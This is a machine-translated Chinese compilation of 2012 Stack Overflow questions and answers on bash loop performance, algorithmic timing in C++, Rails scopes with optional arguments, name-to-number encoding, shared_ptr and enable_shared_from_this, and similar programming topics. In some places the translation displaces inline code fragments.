> 赞同：1
> 
> 时间：2012-04-26T17:47:43.397

你可以找到`>`使用的位置`start =str.indexof(">");`

也是`</`使用位置`stop=str.indexof("</");`

然后得到字符串 str = str.subString(start,stop);

你会得到 helloX...

======================================

[https://stackoverflow.com/a/10000095/1289716](https://stackoverflow.com/a/10000095/1289716)看到这个答案.....

将您的**{**括号和**}**括号替换为 **& #123; ** 和 **& #125;**

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-26T17:52:44.160

使用正则表达式并填充数组。这是我写的一个小测试程序：

```
public static void main(String [] args) {
    Pattern p = Pattern.compile("<option value=\"(.*?)\">(.*?)</option>");
    String line = "<option value=\"{1}\">hello0</option>";
    Matcher m = p.matcher(line);
    while (m.find()) {
        String value = m.group(1);
        String name = m.group(2);
        System.out.println(value);
        System.out.println(name);
        // Now add to your arrays
    }
} 
```

我不会将其用作解析复杂 xml 文件的标准方法。如果是这种情况，请使用 xml 解析器。

# php - 元素上的 CSS 文本换行（与自动换行或空格无关）

> ID：10338581
> 
> 赞同：1
> 
> 时间：2012-04-26T17:41:23.910
> 
> 标签：php, css, wordpress, word-wrap

所以这里是它的要点，请多多包涵。

我有一个由文本和图像组成的徽标（示例：本示例中的 big@company @=logo 图像）。我正在构建一个 wordpress 站点，并希望使用 php bloginfo('name') 自动填写此徽标的文本，但我有这张图片，我必须在单词之间加载。

我来自印刷设计背景，基本上我想要做的是将图像放在文本之上，并使文本在图像周围变形。有道理？

我尝试以这种方式做事的原因是为了保持它对 seo 友好，我意识到我可以按照我想要的方式硬编码，只需将文本缩进 -9999 的 php bloginfo 部分，但最近读到谷歌开始将此视为垃圾邮件技术。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T17:45:46.983

这是你要找的吗？

`big<img src="logo.jpg" style="display:inline"/>company`

# bash - 为什么约会这么慢？

> ID：10338584
> 
> 赞同：1
> 
> 时间：2012-04-26T17:41:47.060
> 
> 标签：bash

任何人都知道更好的方法来做到这一点，如果它更快？目前在将高行每秒推送到此脚本时很慢：

* * *

```
#!/bin/bash

declare -A clientarray
file=$1
timer=$2
e=$(date --date "now +$timer second" +%s)

while read line
do

    if [ -n "${clientarray[$line]}" ]; then
            let "clientarray[$line]=clientarray[$line]+1"
            echo "$line: ${clientarray[$line]}"

    elif [ -z "${clientarray[$line]}" ]; then
            clientarray[$line]=1
            echo "$line: ${clientarray[$line]}"

    fi
    if [ $(date +%s) -gt $e ]; then
                    e=$(date --date "now +$timer second" +%s)

    fi
done < <(tail -F $file | gawk -F"]" '/]/ {print $1}') 
```

* * *

这是行的示例：

```
someline]
someline2]
somethingidontwant
someline3]
somethingelseidontwant
someline4] 
```

并调用脚本：

```
bash script.sh somelogfile.log 1 
```

如果我在最后注释掉 if 逻辑，它会非常快，但速度会下降 2/3。用 pv 测试它：

（这与 if 逻辑有关）：

```
ubuntu@myhost:~/graphs$ tail -F somelogfile.log | pv -N RAW -lc >/dev/null | 
                      > bash script.sh somelogfile.log 1 | pv -N SCP -lc >/dev/null

  RAW: 2.18k 0:00:16 [ 493/s ] [                 <=>                             ]
  SCP:  593 0:00:16 [ 150/s ] [             <=>                                  ] 
```

（这是没有）

```
ubuntu@myhost:~/graphs$ tail -F somelogfile.log | pv -N RAW -lc >/dev/null |
                      > bash script.sh somelogfile.log 1 | pv -N SCP -lc >/dev/null

  RAW: 7.69k 0:00:15 [512/s] [                                     <=>           ]
  SCP:  7.6k 0:00:15 [503/s] [                              <=>                  ] 
```

如果我在脚本或测试方面遗漏了什么，请告诉我，尤其是任何“DOH！”。我想在这一点上我会喜欢一个=）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-26T18:23:10.753

作为猜测，我会说最后一个`if`...`fi`块每次迭代都会添加两个非内置命令。循环中的其他所有内容都是 bash 内置函数，执行速度要快得多。有了它，您可以`date`在测试中调用 to，并在`if`. 此外，每次调用时`date --date`都必须解析和评估该表达式，考虑到的普遍性，这可能不是很快。如果我是你，我会尝试用一种脚本语言重新实现它，对日期/时间进行更多的本地处理：Perl、Ruby、Python，无论你喜欢什么。`"now +$timer second"``--date`

您似乎也有一个错误：

```
if [ `date +%s` > $e ] ... 
```

这说：执行命令`date +%s`并将其输出（例如`12345`）插入另一个命令`[ 12345 > $e ]`（到目前为止一切都很好）。该命令说：使用两个参数 (和) 运行`[`内置命令，并将其标准输出流重定向到以(uh-oh)的值命名的文件。您可能想使用而不是此处。`12345``]``$e``-gt``>`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-09-03T07:48:32.577

我不确定你在做什么`$e`，但你可以使用内置的 shell 打印当前日期，`printf`这比调用`date`. 子流程调用往往很昂贵。例如，如果您不在 glibc2 上，您可以执行以下操作：

```
printf '%(%+)T\n' -1 
```

准确获取 date 命令的输出。`%+`glibc2 不支持，因此您可以构造与其他参数相同的东西，或类似的东西：

```
printf '%(%c %Z)T\n' -1 
```

如果您需要以某种方式捕获和处理日期，那么您可能仍然需要使用 subshel​​l 调用，`$()`但很有可能它仍然比`date`.

# c++ - O(n) 比 O(nlogn) 花费更多时间

> ID：10338585
> 
> 赞同：1
> 
> 时间：2012-04-26T17:42:08.667
> 
> 标签：c++, caching

我在 spoj 上尝试[了这个](http://www.spoj.pl/problems/GONESORT/)问题。首先，我想出了一种微不足道的 o(blogb) 算法（请参阅问题的什么 b）。但是由于问题的作者提到了 b 属于 [0,10^7] 的约束，我不相信如果它会通过。无论如何，出于剪切信念，我将其编码如下

```
#include<stdio.h>
#include<iostream>
#include<algorithm>
#include<cmath>
#include<vector>
#include<cstdlib>
#include<stack>
#include<queue>
#include<string>
#include<cstring>

#define PR(x) cout<<#x"="<<x<<endl
#define READ2(x,y) scanf("%d %d",&x,&y)
#define REP(i,a) for(long long i=0;i<a;i++)
#define READ(x) scanf("%d",&x)
#define PRARR(x,n) for(long long i=0;i<n;i++)printf(#x"[%d]=\t%d\n",i,x[i])
using namespace std;
#include <stdio.h>
struct node {
          int val;
          int idx;
          };

bool operator<(node a,node b){ return a.val<b.val;}
node contain[10000001];
int main(){
          int mx=1,count=1,t,n;
          scanf("%d",&t);
          while(t--){
                count=1;mx=1;
                scanf("%d",&n);
                for(int i=0;i<n;i++){
                        scanf("%d",&contain[i].val);
                        contain[i].idx=i;
                        }
          sort(contain,contain+n);
          for(int j=1;j<n;j++){
                    if(contain[j].idx>contain[j-1].idx)
                            count++;
                            else count=1;
                            mx=max(count,mx);
                                }
                    printf("%d\n",n-mx);
                    }
                   } 
```

它在 SPOJ 服务器上以 0.01 秒通过（已知速度很慢）但我很快想出了一个 O(b) 算法，代码如下

```
 #include<stdio.h>
    #include<iostream>
    #include<algorithm>
    #include<cmath>
    #include<vector>
    #include<cstdlib>
    #include<stack>
    #include<queue>
    #include<string>
    #include<cstring>

    #define PR(x) printf(#x"=%d\n",x)
    #define READ2(x,y) scanf("%d %d",&x,&y)
    #define REP(i,a) for(int i=0;i<a;i++)
    #define READ(x) scanf("%d",&x)
    #define PRARR(x,n) for(int i=0;i<n;i++)printf(#x"[%d]=\t%d\n",i,x[i])
    using namespace std;
    int val[1001];
    int arr[1001];
    int main() { 
    int t;
    int n;
    scanf("%d",&t);
    while(t--){
            scanf("%d",&n);
            int mn=2<<29,count=1,mx=1;
            for(int i=0;i<n;i++){
                    scanf("%d",&arr[i]);
                    if(arr[i]<mn) { mn=arr[i];}
                    }
            for(int i=0;i<n;i++){
                    val[arr[i]-mn]=i;
                    }
            for(int i=1;i<n;i++){
            if(val[i]>val[i-1]) count++;
            else {

            count=1;
            }
            if(mx<count) mx=count;
            }
            printf("%d\n",n-mx);
            }
    } 
```

但令人惊讶的是它花了**0.14 秒**：O

现在我的问题是**o(b) 不是比 o(blogb) 更好 b > 2**吗？那为什么时间差这么大？社区的一位成员建议这可能是由于缓存未命中。与 o(blogb) 相比，o(b) 代码的本地化程度较低。但我**认为**对于 <1000运行代码？（是的b实际上小于1000。不知道为什么问题设置者夸大了这么多）

**编辑**：我看到所有答案都指向渐近符号中的隐藏常数值，这通常会导致算法运行时间的差异。但是如果你查看代码，你会意识到我所做的只是用另一个遍历替换**排序**调用的循环。现在我假设 sort 至少访问数组的每个元素一次。如果我们考虑执行的行数，这不会使两个程序更接近吗？除了是的，我过去使用 spoj 的经验告诉我 I/O对程序的运行时间产生巨大影响，但我在两个代码中使用相同的 I/O 例程。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-26T17:51:07.280

大 O 表示法描述了当输入集接近无限大小时函数需要多长时间。如果你有足够大的数据集，O(n) 总是会超过 O(n log n)。

在实践中，由于大 O 公式中的其他隐藏变量，一些“性能较差”的算法更快。一些更具可扩展性的算法可能会更慢。随着输入集变得更小，差异变得更加任意。

当我花了几个小时实施一个可扩展的解决方案时，我通过艰难的方式学到了所有这些，并且在测试时发现它只会对大型数据集更快。

编辑：

关于具体案例，有人提到同一行代码在性能方面可能会有很大差异。这很可能是这里的情况。这意味着大 O 公式中的“隐藏变量”非常相关。您越了解计算机的内部工作原理，您掌握的优化技术就越多。

如果你只记得一件事，请记住这一点。永远不要仅仅通过阅读代码来比较两种算法的性能。如果这很重要，请在实际数据集上进行实际实施。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-26T17:50:48.493

I/O 操作 ( `scanf()`, `printf()`) 使结果产生偏差。

这些操作是出了名的缓慢，并且在计时时显示出很大的差异。你永远不能使用包含任何 i/o 操作来衡量代码的性能，除非这些操作是你想要衡量的。

所以，删除这些电话，然后再试一次。

我还要指出，0.1s 非常小。0.1s 的差异可能是指加载可执行文件和准备执行代码所花费的时间。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-04-26T17:50:19.077

Big-O 表示法不是一个可以插入任意值的公式`n`。它仅将函数的增长描述`n`为无穷大。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-26T17:51:06.727

这是一个比人们想象的更有趣的问题。O() 概念可能很有用，但并不总是像某些人想象的那么有用。对于对数阶尤其如此。在代数上，对数的阶数确实为零，也就是说 log(n)/n^epsilon 对于任何正的 epsilon 都会收敛。

比我们想象的更多的是，订单计算中的对数因素并不重要。

然而，肯德尔·弗雷是对的。对于足够大的数据集，O(n*log(n)) 最终会丢失。只是数据集*可能*必须非常大才能显示对数差异。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-27T06:24:29.620

我在 SPOj 中查看了您的解决方案。我注意到您的 O(nlogn) 解决方案占用了 79M 内存，而 O(n) 占用了非常少量的内存，显示为 0K。我也查看了其他解决方案。我看过的大多数最快的解决方案都使用了大量的内存。现在我能想到的最明显的原因是`std::sort()`函数的实现。它实现得非常好，使您的解决方案速度惊人。对于 O(n) 解决方案，我认为它可能会很慢，因为`if() {...} else {...}`. 尝试将其更改为三元运算符，并让我们知道它是否有任何不同。

希望能帮助到你 ！！

# xcode - 使用已下载且缺少 .xcodeproj 的示例项目

> ID：10338590
> 
> 赞同：1
> 
> 时间：2012-04-26T17:42:17.963
> 
> 标签：xcode

我正在尝试学习 Obj-C，但是当我下载示例项目时，我下载的所有示例中似乎都缺少 .xcodeproj 文件。不太清楚为什么，但我被卡住了。几个问题（重叠）：

1.  如果 .xcodeproj 文件丢失，我如何打开这些项目来运行它们？
2.  如何将这些下载的示例转换为我可以使用的项目？
3.  是否有一些根本原因导致不包含 .xcodeproj 文件似乎是标准做法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T18:13:25.123

没有 .xcodeproj 就无法打开项目。该目录包含几个强制性信息，例如：

*   文件列表，项目资源，
*   编译选项，
*   等等

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-04T20:26:16.283

使用 git 命令行克隆存储库时，我遇到了同样的问题。

但是，如果您使用 XCode 的集成源代码控制功能来处理现有项目，您可以打开该项目，您会在源代码目录中找到 xcodeproj。

为此，启动 XCode，选择“连接到存储库”，指定位置（例如：[https](https://github.com/insurgentgames/Alphabet-Blocks.git) ://github.com/insurgentgames/Alphabet-Blocks.git ），点击“克隆”，然后打开项目。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-26T18:25:03.983

你从哪里得到这些样品？xcodeproj 文件是否可能隐藏在您的文件系统中？如果真的没有 .xcodeproj 文件，那么自己制作并拖入源文件并不难。

# itextsharp - 在 PDF 中创建不可选择的文本水印

> ID：10338592
> 
> 赞同：1
> 
> 时间：2012-04-26T17:42:33.160
> 
> 标签：itextsharp, watermark

添加文本水印并单击 PDF 后，Acrobat 阅读器将显示一个**闪烁的大光标**，看起来更像是渲染工件或开始**选择水印文本**。

**水印文本可以设为不可选择吗？**

水印是现有内容下的大“草稿”文字：使用[c#itextsharp PDF创建每页带水印](https://stackoverflow.com/questions/2372041/c-sharp-itextsharp-pdf-creation-with-watermark-on-each-page)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-26T20:41:56.387

据我所知，没有办法使文本不可选择。

作为大闪烁光标的替代方案，您可以将水印图像放在 PDF 上。当您将鼠标悬停在水印图像上时，这会给出一个小的十字光标。

示例： [如何在现有 PDF 中插入带有 iTextSharp 的图像？](https://stackoverflow.com/questions/583629/how-can-i-insert-an-image-with-itextsharp-in-an-existing-pdf)

# dtmf - 如何将 wav 转换为浮点数组缓冲区？

> ID：10338594
> 
> 赞同：1
> 
> 时间：2012-04-26T17:42:42.957
> 
> 标签：dtmf, wav

我需要能够读取 wav 文件并将数据加载到我的缓冲区中。我可以使用该数组与其他浮点数组进行卷积。我该如何做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T19:31:01.873

看看[**袜子**](http://sox.sourceforge.net/)。您可以使用 sox 读入文件，并将样本输出为和`wav`之间的浮点值。`-1``1`

# asp.net - 为什么使用 EF 4.3.1 时 DateTime.Now 关闭 12 小时？

> ID：10338595
> 
> 赞同：1
> 
> 时间：2012-04-26T17:42:43.573
> 
> 标签：asp.net, sql-server-2008, entity-framework

我有一个由 EF 4.3.1 代码首先配置的 datetime2 列。我刚刚注意到，当我使用 DateTime.Now 更新我的实体时，更新/插入到 SQL Server 2008 中的值减少了 12 小时。

任何想法在哪里或为什么会发生这种情况？我机器上的系统时间是正确的，我直接调用并使用 GETDATE() 的所有存储过程都按预期工作。

莫名其妙。

还有一点需要注意。在调用 context.savechanges 之前，DateTime 一直是正确的。EF 正在做的事情或 EF 将其传递给 SQL Server 的方式变得混乱。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T17:56:42.690

来自[MSDN](http://msdn.microsoft.com/en-us/library/ms188383.aspx)：GETDATE() 将当前数据库系统时间戳作为日期时间值返回，不带数据库时区偏移量。

您的问题的原因很可能与它有关。

# ruby-on-rails - 是否可以有一个带有可选参数的范围？

> ID：10338596
> 
> 赞同：23
> 
> 时间：2012-04-26T17:42:49.173
> 
> 标签：ruby-on-rails, ruby-on-rails-3, activerecord, scope

是否可以编写带有可选参数的范围，以便我可以使用和不使用参数来调用范围？

就像是：

```
scope :with_optional_args,  lambda { |arg|
  where("table.name = ?", arg)
}

Model.with_optional_args('foo')
Model.with_optional_args 
```

如果给出了 arg（如 Unixmonkey 所述），我可以检查 lambda 块，但是在没有参数的情况下调用范围时，我得到了一个`ArgumentError: wrong number of arguments (0 for 1)`

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2012-04-26T19:05:58.150

Ruby 1.9 扩展块具有与方法相同的功能（其中包含默认值）：

```
scope :cheap, lambda{|max_price=20.0| where("price < ?", max_price)} 
```

称呼：

```
Model.cheap
Model.cheap(15) 
```

* * *

## 回答 #2

> 赞同：22
> 
> 时间：2012-04-26T18:52:06.230

是的。只需`*`在方法中使用 a 即可。

```
scope :print_args, lambda {|*args|
    puts args
} 
```

* * *

## 回答 #3

> 赞同：14
> 
> 时间：2012-04-26T18:48:24.360

我`scope :name, ->(arg1, arg2 = value) { ... }`几周前用过，如果我没记错的话，效果很好。与 ruby​​ 1.9+ 一起使用

* * *

## 回答 #4

> 赞同：11
> 
> 时间：2014-08-20T16:47:12.060

您可以根据给定的参数有条件地修改您的范围。

```
scope :random, ->(num = nil){ num ? order('RANDOM()').limit(num) : order('RANDOM()') } 
```

用法：

```
Advertisement.random # => returns all records randomized
Advertisement.random(1) # => returns 1 random record 
```

或者，您可以提供默认值。

```
scope :random, ->(num = 1000){ order('RANDOM()').limit(num) } 
```

用法：

```
Product.random # => returns 1,000 random products
Product.random(5) # => returns 5 random products 
```

注意：显示的语法`RANDOM()`特定于 Postgres。显示的语法是 Rails 4。

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2013-02-11T23:59:44.460

只是想让您知道，根据[指南](http://guides.rubyonrails.org/active_record_querying.html#scopes)，将参数传递给作用域的推荐方法是使用类方法，如下所示：

```
class Post < ActiveRecord::Base
  def self.1_week_before(time)
    where("created_at < ?", time)
  end
end 
```

这可以提供更清洁的方法。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-04-26T17:59:31.590

当然。

```
scope :with_optional_args,  Proc.new { |arg|
  if arg.present?
    where("table.name = ?", arg)
  end
} 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2016-07-14T19:18:32.647

使用 *

```
scope :with_optional_args,  -> { |*arg| where("table.name = ?", arg) } 
```

# php - JqG rid 编辑表单在下拉列表中不显示正确的项目

> ID：10338598
> 
> 赞同：1
> 
> 时间：2012-04-26T17:43:13.130
> 
> 标签：php, mysql, select, jqgrid, edit

我有一个由数据库填充的网格。其中一列是另一个表中 2 列的连接。在这种情况下，它是团队的位置和名称。但是，当我单击编辑并填充编辑表单时，它总是选择下拉列表中的第一个团队，而不是数据库中的实际团队。

以下是一些相关代码：

```
jQuery("#listPlayer").jqGrid({
    url:'../controller/playerGrid.php',
    datatype: "json",
    colNames:['ID','First Name','Last Name', 'Team'],
    colModel:[
            {name:'id',         index:'id',         width:20,   editable:false, hidden:true},
            {name:'first_name', index:'first_name', width:80,   editable:true, editrules: {required: true}},
            {name:'last_name',  index:'last_name',  width:80,   editable:true, editrules: {required: true}},
            {name:'idTeam',     index:'idTeam',     width:50,   editable:true, editrules: {required: true}, edittype: 'select', editoptions: { dataUrl: "../controller/listTable.php?query=team" } }
    ],
    rowNum:50,
    rowTotal: 2000,
    rowList : [20,30,50],
    mtype: "POST",
    rownumbers: true,
    rownumWidth: 40,
    gridview: true,
    pager: '#pagerPlayer',
    sortname: 'last_name',
    viewrecords: true,
    sortorder: "asc",
    caption: "Player Manager",
    editurl: "../controller/playerEditGrid.php" 
```

这就是 listTable.php 中的 SQL 查询的样子：

```
SELECT t.id, CONCAT(t.location, ' ', t.name,' (', l.abbr, ')' ) as idTeam FROM team t, league l WHERE t.idLeague = l.id ORDER BY t.location 
```

我知道问题在于它是串联而不是单列，但我确信有办法解决它......我只是不知道。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T23:10:53.353

我没有以这种方式使用它，但 jqgrid 帮助的以下部分应该适用于您的情况：[http ://www.trirand.com/jqgridwiki/doku.php?id=wiki:common_rules#select](http://www.trirand.com/jqgridwiki/doku.php?id=wiki%3acommon_rules#select)

您的 dataurl 的返回应该已经是一个有效的 HTML 选择元素，例如：

```
<select> 
<option value='1'>One</option> 
<option value='2'>Two</option> 
...
</select> 
```

参考3.在上面的url中***设置editoptions dataUrl参数。***

希望这可以帮助！

# string - 将名称字符串编码为唯一编号

> ID：10338599
> 
> 赞同：6
> 
> 时间：2012-04-26T17:43:15.173
> 
> 标签：string, algorithm, math, text

我有一大堆名字（数百万）。他们每个人都有一个名字、一个可选的中间名和一个姓氏。我需要将这些名称编码为唯一代表名称的数字。编码应该是一对一的，即一个名字只能和一个数字相关联，一个数字只能和一个名字相关联。

对此进行编码的聪明方法是什么？我知道根据其在字母集中的位置（a-> 1、b->2.. 等等）标记名称的每个字母很容易，因此像 Deepa 这样的名称会得到 -> 455161，但又一次在这里，我无法确定“16”是否真的是 16 或 1 和 6 的组合。

所以，我正在寻找一种编码名称的智能方法。

此外，编码应该使得任何名称的输出数字中的位数应该具有固定的位数，即，它应该与长度无关。这可能吗？

谢谢阿布舍克 S

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-04-26T19:50:48.057

要获得相同的宽度数字，你不能在左边填零吗？

一些选项：

1.  对它们进行排序。数一数。第 10 个名字是 10 号。
2.  将每个字符视为 26（不区分大小写，无数字）或 52（有效，无数字）或 36（数字不区分大小写）或 62（数字区分大小写）数字中的数字。计算 int 中的值。例如，对于“abc”的名称，您将有 0 * 26^2 + 1 * 26^1 + 2 * 20^0。有时中文名称可能会使用数字来表示音调。
3.  使用“完美哈希”方案：[http ://en.wikipedia.org/wiki/Perfect_hash_function](http://en.wikipedia.org/wiki/Perfect_hash_function)
4.  这主要是在乐趣中建议的：使用 goedel 编号:)。所以“abc”将是 2^0 * 3^1 * 5^2 - 它是素数幂的乘积。考虑数字可以让您恢复字符。不过，这些数字可能会变得很大。
5.  如果您还没有使用它，请转换为 ASCII。然后将字符的每个序数视为 base-256 编号系统中的数字。所以“abc”是 0*256^2 + 1*256^1 + 2*256^0。

如果您需要能够不时更新您的姓名和号码列表，#2、#4 和#5 应该可以工作。#1 和 #3 会有问题。#5 可能是最具前瞻性的，尽管您可能会发现在某些时候需要 unicode。

我相信您可以使用 2^32 而不是 2^8 == 256 的幂来将 unicode 作为 #5 的变体。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-26T17:51:16.823

你在那里尝试做的实际上是散列（至少如果你有固定的位数）。有一些很好的散列算法很少发生冲突。例如，试试 sha1，它经过了良好的测试并且可用于现代语言（参见[http://en.wikipedia.org/wiki/Sha1）——](http://en.wikipedia.org/wiki/Sha1)它似乎对 git 来说已经足够好了，所以它可能对你有用。

当然，对于两个不同的名称，相同的哈希值的可能性很小，但是对于哈希来说总是如此，并且可以处理。使用 sha1 等，您不会在名称和 ID 之间建立任何明显的联系，这可能是好事也可能是坏事，具体取决于您的问题。

如果您确实想要唯一的 ID，您将需要执行 NealB 建议的操作，自己创建 ID 并在数据库中连接名称和 ID（您可以随机创建它们并检查冲突或增加它们，从 0000000000001 左右开始） .

（经过深思熟虑并阅读第一条评论后改进了答案）

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2016-12-01T14:40:09.583

您可以`BigInteger`像这样使用编码任意字符串：

```
BigInteger bi = new BigInteger("some string".getBytes()); 
```

并且为了得到字符串回来使用：

```
String str = new String(bi.toByteArray()); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-01-30T06:14:50.357

我一直在寻找与您提出的问题非常相似的问题的解决方案，这就是我想出的：

```
def hash_string(value):
    score = 0
    depth = 1
    for char in value:
        score += (ord(char)) * depth
        depth /= 256.
    return score 
```

如果你对 Python 不熟悉，那么它就是这样做的。

1.  分数最初为 0，深度设置为 1
2.  为每个字符添加`ord`值 * 深度
    1.  该`ord`函数返回每个字符的 UTF-8 值 (0-255)
    2.  然后乘以“深度”。
3.  最后深度除以 256。

从本质上讲，它的工作方式是最初的角色增加了更多的分数，而后来的角色越来越少。如果您需要整数，请将最终分数乘以 2**64。否则，您将有一个介于 0-256 之间的十进制值。这种编码方案适用于二进制数据，并且一个字节/字符中只有 256 个可能的值。

此方法适用于较小的字符串值，但是，对于较长的字符串，您会注意到十进制值需要比常规双精度（64 位）所能提供的更高的精度。在 Java 中，您可以使用“BigDecimal”，而在 Python 中，可以使用“decimal”模块来提高精度。使用此方法的一个好处是返回的值是按排序顺序排列的，因此可以“有效地”搜索它们。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-04-26T18:01:59.077

看看[https://en.wikipedia.org/wiki/Huffman_coding](https://en.wikipedia.org/wiki/Huffman_coding)。这是标准方法。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-04-26T18:01:49.117

你可以翻译它，如果每个字符（至少加上空白）都会占据一个位置。

因此 ABC，即 1,2,3 必须翻译成

```
1*(2*26+1)² + 2*(53) + 3 
```

这样，您可以对任意字符串进行编码，但如果输入的长度不受限制（以及应该如何限制？），则不能保证长度有上限。

# c++ - 多个 shared_ptr 存储相同的指针

> ID：10338606
> 
> 赞同：12
> 
> 时间：2012-04-26T17:43:35.910
> 
> 标签：c++, c++11, shared-ptr

考虑这个程序：

```
#include <memory>
#include <iostream>

class X
  : public std::enable_shared_from_this<X>
{
public:
  struct Cleanup1 { void operator()(X*) const; };
  struct Cleanup2 { void operator()(X*) const; };
  std::shared_ptr<X> lock1();
  std::shared_ptr<X> lock2();
};

std::shared_ptr<X> X::lock1()
{
  std::cout << "Resource 1 locked" << std::endl;
  return std::shared_ptr<X>(this, Cleanup1());
}

std::shared_ptr<X> X::lock2()
{
  std::cout << "Resource 2 locked" << std::endl;
  return std::shared_ptr<X>(this, Cleanup2());
}

void X::Cleanup1::operator()(X*) const
{
  std::cout << "Resource 1 unlocked" << std::endl;
}

void X::Cleanup2::operator()(X*) const
{
  std::cout << "Resource 2 unlocked" << std::endl;
}

int main()
{
  std::cout << std::boolalpha;

  X x;
  std::shared_ptr<X> p1 = x.lock1();
  {
    std::shared_ptr<X> p2 = x.lock2();
  }
} 
```

我在 C++11 标准第 20.7.2 节中没有看到任何内容表明其中任何内容都是无效的。`shared_ptr`让两个对象存储相同的指针`&x`但不共享所有权并使用不会结束生命周期的“删除器”有点不寻常`*get()`，但没有任何禁止它。（如果其中任何一个完全不是故意的，就很难解释为什么某些`shared_ptr`成员函数接受一个`std::nullptr_t`值。）正如预期的那样，程序输出：

```
Resource 1 locked
Resource 2 locked
Resource 2 unlocked
Resource 1 unlocked 
```

但现在如果我添加一点`main()`：

```
int main()
{
  std::cout << std::boolalpha;

  X x;
  std::shared_ptr<X> p1 = x.lock1();
  bool test1( x.shared_from_this() );
  std::cout << "x.shared_from_this() not empty: " << test1 << std::endl;
  {
    std::shared_ptr<X> p2 = x.lock2();
  }
  try {
    bool test2( x.shared_from_this() );
    std::cout << "x.shared_from_this() not empty: " << test2 << std::endl;
  } catch (std::exception& e) {
    std::cout << "caught: " << e.what() << std::endl;
  }
} 
```

然后事情变得更加棘手。使用 g++ 4.6.3，我得到输出：

```
Resource 1 locked
x.shared_from_this() not empty: true
Resource 2 locked
Resource 2 unlocked
caught: std::bad_weak_ptr
Resource 1 unlocked 
```

为什么第二次调用会`shared_from_this()`失败？满足 20.7.2.4p7 的所有要求：

> *Requires:* `enable_shared_from_this<T>`应该是一个可访问的基类`T`。`*this`应该是`t`类型对象的子对象`T`。应至少有*一个*`shared_ptr`实例`p`拥有. *`&t`*

 *[`T`是`X`，`t`是`x`，`p`是`p1`。]

但是 g++`enable_shared_from_this`基本上遵循 20.7.2.4p10 中（非规范）“注释”中建议的实现，使用`weak_ptr`class 中的私有成员`enable_shared_from_this`。如果不做一些相当复杂的事情，似乎不可能解决这类问题`enable_shared_from_this`。

这是标准中的缺陷吗？（如果是这样，这里不需要评论解决方案“应该”是什么：添加一个要求以便示例程序调用未定义的行为，将注释更改为不建议这样一个简单的实现就足够了，....）

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-26T18:40:32.587

是的，C++11 有一个缺陷。允许这样做：

> 让两个 shared_ptr 对象存储相同的指针 &x 但不共享所有权以及使用不会结束 *get() 生命周期的“删除器”有点不寻常，但没有什么禁止它的。

*无论*“删除者”做什么，都应该明确说明这是未定义的行为。当然，从技术上讲，以这种方式做事可能并不违法。

但是，您在对使用该代码的人*撒谎。*任何收到 a 的人的期望`shared_ptr`是他们现在拥有该对象的所有权。只要他们保留它`shared_ptr`（或其副本），它指向的对象仍然存在。

您的代码并非如此。所以我会说它在语法上是正确的，但在语义上是无效的。

的语言`shared_from_this`很好。这`shared_ptr`是需要改变的语言。它应该声明创建“拥有”相同指针的两个单独的唯一指针是未定义的行为。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2015-08-25T10:23:29.590

我同意这是规范中的一个漏洞，因此是一个缺陷。[它与http://open-std.org/jtc1/sc22/wg21/docs/lwg-active.html#2179](http://open-std.org/jtc1/sc22/wg21/docs/lwg-active.html#2179)基本相同，尽管这个问题来自一个稍微不同（恕我直言，更明显的问题）的角度。

我不确定我是否同意这是对`shared_ptr`. 我认为问题在于当您尝试将这种用法与`shared_ptr`with结合使用时`enable_shared_from_this`。

所以我的第一个想法是通过扩展以下要求来解决它`shared_from_this`：

> *Requires:* `enable_shared_from_this<T>`应该是一个可访问的基类`T`。`*this`应该是`t`类型对象的子对象`T`。应至少有一个拥有的`shared_ptr`实例`p`，*拥有* `&t` **的任何其他`shared_ptr`实例`&t`应与`p`**.

但这还不够，因为您的示例满足该要求：在第二次调用时`shared_from_this()`只有一个所有者 ( `p1`)，但您已经`enable_shared_from_this`通过调用“破坏”了基类的状态`lock2()`。

该程序的较小形式是：

```
#include <memory>
using namespace std;

int main()
{
  struct X : public enable_shared_from_this<X> { };
  auto xraw = new X;
  shared_ptr<X> xp1(xraw);   // #1
  {
    shared_ptr<X> xp2(xraw, [](void*) { });  // #2
  }
  xraw->shared_from_this();  // #3
} 
```

所有三个 libstdc++、libc++ 和 VC++ (Dinkumware) 行为相同并抛出`bad_weak_ptr`#3，因为在 #2 他们更新了`weak_ptr<X>`基类的成员以使其与 共享所有权`xp2`，这超出了范围而使`weak_ptr<X>`处于过期状态.

有趣的是`boost::shared_ptr`，它没有抛出，而是 #2 是无操作的，而 #3 返回与 .`shared_ptr`共享所有权的a `xp1`。这是为了响应与上述示例几乎完全相同的[错误报告而完成的。](https://svn.boost.org/trac/boost/ticket/2584)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-05-29T12:10:12.083

